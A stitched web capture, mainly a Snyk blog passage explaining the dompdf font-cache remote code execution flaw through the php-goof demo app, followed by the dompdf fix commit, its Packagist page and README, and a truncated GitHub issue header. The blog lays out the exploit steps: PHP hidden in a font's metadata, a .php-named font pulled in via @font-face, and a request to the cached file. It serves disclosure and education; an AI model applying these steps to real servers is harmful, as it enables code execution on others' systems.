So for most of us, using a library to do these kinds of functions in application development helps speed up the app development process. Libraries like [dompdf](https://github.com/dompdf/dompdf) mean that as developers, we are able to build out mundane functionality and move on to the more complex things.

## Getting hands-on with the dompdf vulnerability

Looking through the original security findings, you can understand more of what is going on inside the library and how it was able to be exploited.

The dompdf library essentially takes normal HTML in its usual format and outputs that into a formatted PDF.

```
1// reference the Dompdf namespace
2use Dompdf\Dompdf;
3
4// instantiate and use the dompdf class
5$dompdf = new Dompdf();
6$dompdf->loadHtml('<html><body>hello world</body></html>');
7
8// (Optional) Setup the paper size and orientation
9$dompdf->setPaper('A4', 'landscape');
10
11// Render the HTML as PDF
12$dompdf->render();
13
14// Output the generated PDF to Browser
15$dompdf->stream();
```

It provides fairly simple and easy to use functionality, removing what would otherwise be a very mundane task for a commonly used piece of functionality. The best part with this functionality is that it will format the PDF output using straight HTML tags.

HTML can also include styles. This can either be inline with the `<html>` tag or via a style sheet. One thing you can do with a style sheet is load in a `font-family` and include a link to a font file.

```
1@font-face {
2    Font-family:'font name';
3    src:url('https://link to a font file’');
4    font-weight:'normal';
5    font-style:'normal';
6  }
```

This is where things start getting a bit interesting.

The dompdf library will not only load in an external style sheet via HTML, but it will also save the font file into a local cache, add it to a font directory on the server, and reference the `font-family` and location from within the dompdf framework.

The next step in the exploit is getting PHP code into a font file which can pass the validation from dompdf and be stored on the server, but still allow that PHP code to run from the font file. This might sound like a tricky task, however the original researchers discovered that the validation inside the library only checks for the file type, *not* the contents of the file.

In the php-goof demo app, you can see how this works by taking a look at the custom font file called [gotcha-normal.otf](https://github.com/snyk-labs/php-goof/tree/main/exploits). For the most part this is indeed a regular font file with completely normal font typesets in it. But inside the meta part of the file, there’s  PHP to be executed on the target app server — `<php? phpinfo(); ?>` — inside the copyright meta field…. Yes It's as easy as that!

![wordpress-sync/blog-dompdf-gotcha](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718172%2Fwordpress-sync%2Fblog-dompdf-gotcha.png&w=2560&q=75)

Then open the font file in a code editor and copy the contents into a .php file, or just rename it. This is important because dompdf will validate the font headers in the file and save to the cache as a .php file and allow it to be an executable php file.

Next, reference that newly created faux font file into the CSS style as a `font-family`. In php-goof, we’re doing this directly from the php-goof repository.

```
1@font-face {
2    font-family:'gotcha';
3    src:url('https://github.com/snyk-labs/php-goof/blob/main/exploits/gotcha_font.php?raw=true');
4    font-weight:'normal';
5    font-style:'normal';
6  }
```

**Note:** It's important here to use the same name from the font file for the `font-family` name or it will not work in dompdf.

Now all that is left is to inject the style sheet into the HTML used for the PDF output. This will then trigger dompdf to store that font on the server and it can be remotely executed. This in itself becomes a bit tricky because the file name is hashed and the font directory can be in a different place.

In php-goof, this part is made a bit easier by using the dompdf framework to identify the font-file location and name. It uses `$dompdf->getFontMetrics()->getFont(“gotcha”, “normal”)` to find out when it's detected in the dompdf font cache.

```
1if($font = $dompdf->getFontMetrics()->getFont("gotcha", "normal")){
2        $html .= "<a href='http://".$_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT']."/vendor/dompdf/dompdf/lib/fonts/".basename($font).".php'>Gotcha hack</a>";
3    }
```

When the gotcha font file is available in the framework, it will then return the path as a link inside the PDF that is generated. Here are some screenshots of the vulnerability as seen from the goof-app:

![wordpress-sync/blog-dompdf-goof-todo](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718168%2Fwordpress-sync%2Fblog-dompdf-goof-todo.png&w=2560&q=75)![wordpress-sync/blog-dompdf-goof-php](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718168%2Fwordpress-sync%2Fblog-dompdf-goof-php.png&w=2560&q=75)![wordpress-sync/blog-dompdf-goof-output](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718171%2Fwordpress-sync%2Fblog-dompdf-goof-output.png&w=2560&q=75)
## Stay safe

Shout out to the team at Positive Security for not only being quite open about their findings, but also the steps they took to try and raise it with the maintainers of dompdf.

Always remember to scan your application code base to identify situations like this that can arise without knowing. Snyk Code can help identify vulnerabilities within frameworks and functions and allow you to do the due diligence to help protect end users and their data.

## Secure your open source dependencies

Snyk's dev-first tooling provides one-click fix PRs for vulnerable open source dependencies and their transitive dependencies.

[Book a live demo](/schedule-a-demo/ "Book a live demo")[Start free](https://app.snyk.io/login "Start free")
### Additional resources

* [5 ways to prevent PHP code injection](/blog/prevent-php-code-injection/)
* [Testing for PHP Composer security vulnerabilities with Snyk](/blog/testing-php-composer-security-vulnerabilities-snyk/)
* [PHP security in Snyk Code now GA](/blog/php-security-support-snyk-code/)

Posted in:[Vulnerability Insights](/blog/?topic=vulnerability-insights)[Open Source Security](/blog/?topic=open-source-security)[Application Security](/blog/?topic=application-security)![wordpress-sync/blog-social-php-composer](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1621453472%2Fwordpress-sync%2Fblog-social-php-composer.png&w=2560&q=75)
### Guide to Choosing a SAST Solution

See the process for assessing, selecting, and implementing a modern SAST solution based on a four phase process and find the best fit for your specific security needs.

[See the guide](https://go.snyk.io/SAST-buyers-guide.html "See the guide")
## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snyk’s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)


=== Content from github.com_e92eea73_20250108_133010.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fcommit%2F4c70e1025bcd9b7694b95dd552499bd83cd6141d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fcommit%2F4c70e1025bcd9b7694b95dd552499bd83cd6141d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dompdf%2Fdompdf)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dompdf](/dompdf)
/
**[dompdf](/dompdf/dompdf)**
Public

* [Notifications](/login?return_to=%2Fdompdf%2Fdompdf) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fdompdf%2Fdompdf)
* [Star
   10.6k](/login?return_to=%2Fdompdf%2Fdompdf)

* [Code](/dompdf/dompdf)
* [Issues
  536](/dompdf/dompdf/issues)
* [Pull requests
  32](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects
  0](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

Additional navigation options

* [Code](/dompdf/dompdf)
* [Issues](/dompdf/dompdf/issues)
* [Pull requests](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

## Commit

[Permalink](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Match installed font filename extension to type

[Browse files](/dompdf/dompdf/tree/4c70e1025bcd9b7694b95dd552499bd83cd6141d)
Browse the repository at this point in the history

```
fixes [#2598](https://github.com/dompdf/dompdf/issues/2598)
```

* Loading branch information

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)

[bsweeney](/dompdf/dompdf/commits?author=bsweeney "View all commits by bsweeney")
committed
Mar 21, 2022

1 parent
[0347b9a](/dompdf/dompdf/commit/0347b9a73f8a03b1b7e659312416f6fd6c7a0cee)

commit 4c70e10

Showing
**1 changed file**
with
**7 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

8 changes: 7 additions & 1 deletion

8
[src/FontMetrics.php](#diff-a0473fa74c65efedd487f657d52cb196245a84d2b13e622818dd0d7283da6d38 "src/FontMetrics.php")

Show comments

[View file](/dompdf/dompdf/blob/4c70e1025bcd9b7694b95dd552499bd83cd6141d/src/FontMetrics.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -206,7 +206,6 @@ public function registerFont($style, $remoteFile, $context = null) |
|  |  | } |
|  |  |  |
|  |  | $cacheEntry = $localFile; |
|  |  | $localFile .= ".".strtolower(pathinfo(parse\_url($remoteFile, PHP\_URL\_PATH), PATHINFO\_EXTENSION)); |
|  |  |  |
|  |  | $entry[$styleString] = $cacheEntry; |
|  |  |  |
| Expand Down  Expand Up | | @@ -258,6 +257,13 @@ public function registerFont($style, $remoteFile, $context = null) |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | switch ($font->getFontType()) { |
|  |  | case "TrueType": |
|  |  | default: |
|  |  | $localFile .= ".ttf"; |
|  |  | break; |
|  |  | } |
|  |  |  |
|  |  | $font->parse(); |
|  |  | $font->saveAdobeFontMetrics("$cacheEntry.ufm"); |
|  |  | $font->close(); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 2 comments on commit `4c70e10`

[![@Jakess39](https://avatars.githubusercontent.com/u/103820922?s=80&v=4)](/Jakess39)

Copy link

### @Jakess39 **[Jakess39](/Jakess39)** commented on `[4c70e10](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d)` [Apr 16, 2022](#commitcomment-71404757)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

> [#2526](https://github.com/dompdf/dompdf/issues/2526)

Sorry, something went wrong.

All reactions

[![@Jakess39](https://avatars.githubusercontent.com/u/103820922?s=80&v=4)](/Jakess39)

Copy link

### @Jakess39 **[Jakess39](/Jakess39)** commented on `[4c70e10](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d)` [Apr 16, 2022](#commitcomment-71404764)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

> > [#2526](https://github.com/dompdf/dompdf/issues/2526)

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fcommit%2F4c70e1025bcd9b7694b95dd552499bd83cd6141d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packagist.org_bdba2ffc_20250108_133014.html ===

Composer v1 support is [coming to an end](https://blog.packagist.com/shutting-down-packagist-org-support-for-composer-1-x/)

Toggle navigation

# [Packagist](/) *The PHP Package Repository*

* [Browse](/explore/)
* [Submit](/packages/submit)
* [Create account](/register/)
* [Sign in](/login/)

   Remember me

  [Use Github](/login/github)
  Log in

  [No account yet? Create one now!](/register/)

Search by [![](/img/algolia-logo-light.svg?v=1733837964)](https://www.algolia.com/)

## [dompdf /](/packages/dompdf/) dompdf

DOMPDF is a CSS 2.1 compliant HTML to PDF converter

##### Maintainers

[![](https://www.gravatar.com/avatar/d2824c2017a878f6fe05db2797694608?s=48&d=identicon "PhenX")](/users/PhenX/)
[![](https://www.gravatar.com/avatar/7324439ccd29915db5c69f1caac65503?s=48&d=identicon "gabrielbull")](/users/gabrielbull/)
[![](https://www.gravatar.com/avatar/2e2984241407caf2d86bf47ecf4e044c?s=48&d=identicon "bsweeney")](/users/bsweeney/)

##### Details

[github.com/dompdf/dompdf](https://github.com/dompdf/dompdf "Canonical Repository URL")

[Homepage](https://github.com/dompdf/dompdf)

[Source](https://github.com/dompdf/dompdf/tree/master)

[Issues](https://github.com/dompdf/dompdf/issues)

[Installs](/packages/dompdf/dompdf/stats):

119 104 390

[Dependents](/packages/dompdf/dompdf/dependents?order_by=downloads):

603

[Suggesters](/packages/dompdf/dompdf/suggesters):

152

[Security](/packages/dompdf/dompdf/advisories):

14

[Stars](https://github.com/dompdf/dompdf/stargazers):

10 637

[Watchers](https://github.com/dompdf/dompdf/watchers):
 291

[Forks](https://github.com/dompdf/dompdf/forks):

1 801

[Open Issues](https://github.com/dompdf/dompdf/issues):

567

v3.0.2
2024-12-27 20:27 UTC

Requires

* php: ^7.1 || ^8.0
* ext-dom: \*
* [ext-mbstring](/providers/ext-mbstring): \*
* [dompdf/php-font-lib](/packages/dompdf/php-font-lib): ^1.0.0
* [dompdf/php-svg-lib](/packages/dompdf/php-svg-lib): ^1.0.0
* [masterminds/html5](/packages/masterminds/html5): ^2.0

Requires (Dev)

* ext-gd: \*
* [ext-json](/providers/ext-json): \*
* [ext-zip](/providers/ext-zip): \*
* [mockery/mockery](/packages/mockery/mockery): ^1.3
* [phpunit/phpunit](/packages/phpunit/phpunit): ^7.5 || ^8 || ^9 || ^10 || ^11
* [squizlabs/php\_codesniffer](/packages/squizlabs/php_codesniffer): ^3.5
* [symfony/process](/packages/symfony/process): ^4.4 || ^5.4 || ^6.2 || ^7.0

Suggests

* ext-gd: Needed to process images
* ext-gmagick: Improves image processing performance
* [ext-imagick](/providers/ext-imagick): Improves image processing performance
* [ext-zlib](/providers/ext-zlib): Needed for pdf stream compression

Provides

None

Conflicts

None

Replaces

None

 LGPL-2.1  baf4084b27c7f4b5b7a221b19a94d11327664eb8

* [The Dompdf Community](https://github.com/dompdf/dompdf/blob/master/AUTHORS.md)

* [dev-master](#dev-master)
* [v3.0.2](#v3.0.2)
* [v3.0.1](#v3.0.1)
* [v3.0.0](#v3.0.0)
* [v2.0.8](#v2.0.8)
* [v2.0.7](#v2.0.7)
* [v2.0.5](#v2.0.5)
* [v2.0.4](#v2.0.4)
* [v2.0.3](#v2.0.3)
* [v2.0.2](#v2.0.2)
* [v2.0.1](#v2.0.1)
* [v2.0.0](#v2.0.0)
* [v1.2.2](#v1.2.2)
* [v1.2.1](#v1.2.1)
* [v1.2.0](#v1.2.0)
* [v1.1.1](#v1.1.1)
* [v1.1.0](#v1.1.0)
* [v1.0.2](#v1.0.2)
* [v1.0.1](#v1.0.1)
* [v1.0.0](#v1.0.0)
* [v0.8.6](#v0.8.6)
* [v0.8.5](#v0.8.5)
* [v0.8.4](#v0.8.4)
* [v0.8.3](#v0.8.3)
* [v0.8.2](#v0.8.2)
* [v0.8.1](#v0.8.1)
* [v0.8.0](#v0.8.0)
* [dev-develop / 0.7.x-dev](#dev-develop)
* [v0.7.0](#v0.7.0)
* [v0.7.0-beta3](#v0.7.0-beta3)
* [v0.7.0-beta2](#v0.7.0-beta2)
* [v0.7.0-beta](#v0.7.0-beta)
* [v0.6.2](#v0.6.2)
* [v0.6.1](#v0.6.1)
* [v0.6.0](#v0.6.0)
* [dev-page-break-updates](#dev-page-break-updates)
* [dev-small-fixes](#dev-small-fixes)
* [dev-resource-validation-updates](#dev-resource-validation-updates)
* [dev-vertical-align](#dev-vertical-align)
* [dev-paging-updates](#dev-paging-updates)
* [dev-rtl](#dev-rtl)
* [dev-rtl\_language\_support\_and\_computed\_css](#dev-rtl_language_support_and_computed_css)

This package is auto-updated.

Last update: 2025-01-06 00:53:20 UTC

---

# README

[![Build Status](https://github.com/dompdf/dompdf/actions/workflows/test.yml/badge.svg)](https://github.com/dompdf/dompdf/actions/workflows/test.yml)
[![Latest Release](https://camo.githubusercontent.com/6ef9bb8474deea5183432842ceabf5ea6add2e2700fa0a0a721356b7a2b893cf/68747470733a2f2f706f7365722e707567782e6f72672f646f6d7064662f646f6d7064662f762f737461626c652e706e67)](https://packagist.org/packages/dompdf/dompdf)
[![Total Downloads](https://camo.githubusercontent.com/8b2c02bc48021b31c18a85be39ec5917883f8b0d135754fe8582d1eb5f3c55bf/68747470733a2f2f706f7365722e707567782e6f72672f646f6d7064662f646f6d7064662f646f776e6c6f6164732e706e67)](https://packagist.org/packages/dompdf/dompdf)
[![License](https://camo.githubusercontent.com/845529e7489535b109f4d139729e1544d2a30bdd2629ffebd2190a6d4877006d/68747470733a2f2f706f7365722e707567782e6f72672f646f6d7064662f646f6d7064662f6c6963656e73652e706e67)](https://packagist.org/packages/dompdf/dompdf)

**Dompdf is an HTML to PDF converter**

At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant
HTML layout and rendering engine written in PHP. It is a style-driven renderer:
it will download and read external stylesheets, inline style tags, and the style
attributes of individual HTML elements. It also supports most presentational
HTML attributes.

*This document applies to the latest stable code which may not reflect the current
release. For released code please
[navigate to the appropriate tag](https://github.com/dompdf/dompdf/tags).*

**Check out the [demo](http://eclecticgeek.com/dompdf/debug.php) and ask any
question on [StackOverflow](https://stackoverflow.com/questions/tagged/dompdf) or
in [Discussions](https://github.com/dompdf/dompdf/discussions).**

Follow us on [![Twitter](https://camo.githubusercontent.com/5fcbb1cdff1796147cb67bacab8d6e92cbad15b4d0d73ae40ab060c0cc977257/687474703a2f2f747769747465722d6261646765732e73332e616d617a6f6e6177732e636f6d2f747769747465722d612e706e67)](http://www.twitter.com/dompdf).

## Features

* Handles most CSS 2.1 and a few CSS3 properties, including @import, @media &
  @page rules
* Supports most presentational HTML 4.0 attributes
* Supports external stylesheets, either local or through http/ftp (via
  fopen-wrappers)
* Supports complex tables, including row & column spans, separate & collapsed
  border models, individual cell styling
* Image support (gif, png (8, 24 and 32 bit with alpha channel), bmp & jpeg)
* No dependencies on external PDF libraries, thanks to the R&OS PDF class
* Inline PHP support
* Basic SVG support (see "Limitations" below)

## Requirements

* PHP version 7.1 or higher
* DOM extension
* MBString extension
* php-font-lib
* php-svg-lib

Note that some required dependencies may have further dependencies
(notably php-svg-lib requires sabberworm/php-css-parser).

### Recommendations

* GD (for image processing)
  + Additionally, the IMagick or GMagick extension improves image processing performance for certain image types
* OPcache (OPcache, XCache, APC, etc.): improves performance

Visit the wiki for more information:
<https://github.com/dompdf/dompdf/wiki/Requirements>

## About Fonts & Character Encoding

PDF documents internally support the following fonts: Helvetica, Times-Roman,
Courier, Zapf-Dingbats, & Symbol. These fonts only support Windows ANSI
encoding. In order for a PDF to display characters that are not available in
Windows ANSI, you must supply an external font. Dompdf will embed any referenced
font in the PDF so long as it has been pre-loaded or is accessible to dompdf and
reference in CSS @font-face rules. See the
[font overview](https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding)
for more information on how to use fonts.

The [DejaVu TrueType fonts](https://dejavu-fonts.github.io/) have been pre-installed
to give dompdf decent Unicode character coverage by default. To use the DejaVu
fonts reference the font in your stylesheet, e.g. `body { font-family: DejaVu Sans; }` (for DejaVu Sans). The following DejaVu 2.34 fonts are available:
DejaVu Sans, DejaVu Serif, and DejaVu Sans Mono.

## Easy Installation

### Install with composer

To install with [Composer](https://getcomposer.org/), simply require the
latest version of this package.

```
composer require dompdf/dompdf
```

Make sure that the autoload file from Composer is loaded.

```
// somewhere early in your project's loading, require the Composer autoloader
// see: http://getcomposer.org/doc/00-intro.md
require 'vendor/autoload.php';
```
### Download and install

Download a packaged archive of dompdf and extract it into the
directory where dompdf will reside

* You can download stable copies of dompdf from
  <https://github.com/dompdf/dompdf/releases>
* Or download a nightly (the latest, unreleased code) from
  <http://eclecticgeek.com/dompdf>

Use the packaged release autoloader to load dompdf, libraries,
and helper functions in your PHP:

```
// include autoloader
require_once 'dompdf/autoload.inc.php';
```

Note: packaged releases are named according using semantic
versioning (*dompdf\_MAJOR-MINOR-PATCH.zip*). So the 1.0.0
release would be dompdf\_1-0-0.zip. This is the only download
that includes the autoloader for Dompdf and all its dependencies.

### Install with git

From the command line, switch to the directory where dompdf will
reside and run the following commands:

```
git clone https://github.com/dompdf/dompdf.git
cd dompdf/lib

git clone https://github.com/PhenX/php-font-lib.git php-font-lib
cd php-font-lib
git checkout 0.5.1
cd ..

git clone https://github.com/PhenX/php-svg-lib.git php-svg-lib
cd php-svg-lib
git checkout v0.3.2
cd ..

git clone https://github.com/sabberworm/PHP-CSS-Parser.git php-css-parser
cd php-css-parser
git checkout 8.1.0
```

Require dompdf and it's dependencies in your PHP.
For details see the [autoloader in the utils project](https://github.com/dompdf/utils/blob/master/autoload.inc.php).

## Framework Integration

* For Symfony: [nucleos/dompdf-bundle](https://github.com/nucleos/NucleosDompdfBundle)
* For Laravel: [barryvdh/laravel-dompdf](https://github.com/barryvdh/laravel-dompdf)
* For Redaxo: [PdfOut](https://github.com/FriendsOfREDAXO/pdfout)

## Quick Start

Just pass your HTML in to dompdf and stream the output:

```
// reference the Dompdf namespace
use Dompdf\Dompdf;

// instantiate and use the dompdf class
$dompdf = new Dompdf();
$dompdf->loadHtml('hello world');

// (Optional) Setup the paper size and orientation
$dompdf->setPaper('A4', 'landscape');

// Render the HTML as PDF
$dompdf->render();

// Output the generated PDF to Browser
$dompdf->stream();
```
### Setting Options

Set options during dompdf instantiation:

```
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('defaultFont', 'Courier');
$dompdf = new Dompdf($options);
```

or at run time

```
use Dompdf\Dompdf;

$dompdf = new Dompdf();
$options = $dompdf->getOptions();
$options->setDefaultFont('Courier');
$dompdf->setOptions($options);
```

See [Dompdf\Options](https://github.com/dompdf/dompdf/blob/HEAD/src/Options.php) for a list of available options.

### Resource Reference Requirements

In order to protect potentially sensitive information Dompdf imposes
restrictions on files referenced from the local file system or the web.

Files accessed through web-based protocols have the following requirements:

* The Dompdf option "isRemoteEnabled" must be set to "true"
* PHP must either have the curl extension enabled or the
  allow\_url\_fopen setting set to true

Files accessed through the local file system have the following requirement:

* The file must fall within the path(s) specified for the Dompdf "chroot" option

## Limitations (Known Issues)

* Table cells are not pageable, meaning a table row must fit on a single page.
* Elements are rendered on the active page when they are parsed.
* Embedding "raw" SVG's (`<svg><path...></svg>`) isn't working yet, you need to
  either link to an external SVG file, or use a DataURI like this:
  ```
  $html = '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '" ...>';
  ```
  Watch [#320](https://github.com/dompdf/dompdf/issues/320) for progress
* Does not support CSS flexbox.
* Does not support CSS Grid.
* A single Dompdf instance should not be used to render more than one HTML document
  because persisted parsing and rendering artifacts can impact future renders.

[![Donate button](https://camo.githubusercontent.com/ce68159b7b2b52b47d5cff1a3b6360c57794b3117c96c50622245f5cac129bf3/68747470733a2f2f7777772e70617970616c2e636f6d2f656e5f55532f692f62746e2f62746e5f646f6e6174655f534d2e676966)](http://goo.gl/DSvWf)

*If you find this project useful, please consider making a donation.
Any funds donated will be used to help further development on this project.)*

* [About Packagist](/about)
* [Atom/RSS Feeds](/feeds/)

* [Statistics](/statistics)
* [Browse Packages](/explore/)

* [API](/apidoc)
* [Mirrors](/mirrors)

* [Status](https://status.packagist.org/)
* [Dashboard](https://p.datadoghq.com/sb/x98w56x71erzshui-4a54c45f82bacc991e83302548934b6a)

Packagist maintenance and hosting provided by [![Private Packagist](/img/private-packagist.svg?v=1733837964)](https://packagist.com/)

Monitoring provided by [![Datadog](/img/datadog-light.png?v=1733837964)](https://datadog.com/)



=== Content from github.com_380a31d5_20250108_133011.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fissues%2F2598)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
